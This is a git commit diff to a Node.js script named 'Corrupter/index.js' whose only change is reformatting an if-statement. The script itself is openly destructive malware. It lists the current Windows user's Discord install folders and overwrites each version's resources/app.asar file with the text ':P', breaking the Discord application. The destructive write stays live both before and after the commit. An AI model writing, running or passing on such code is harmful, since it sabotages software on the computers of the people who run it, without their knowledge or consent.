f7e60d4680ebf44f3f200e7242b604f755c0b843
Trac3D1y <i2rys@protonmail.com>
2022-03-18 21:12:00 +0800

    Cleaned

--- Corrupter/index.js
+++ Corrupter/index.js
@@ -5,8 +5,6 @@ const Os = require("os")
 //Main
 Fs.readdir(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord`, function(err, results){
     results.forEach(file =>{
-        if(file.indexOf("app-") != -1){
-            Fs.writeFileSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${file}\\resources\\app.asar`, ":P", "utf8")
-        }
+        if(file.indexOf("app-") !== -1) Fs.writeFileSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${file}\\resources\\app.asar`, ":P", "utf8")
     })
 })
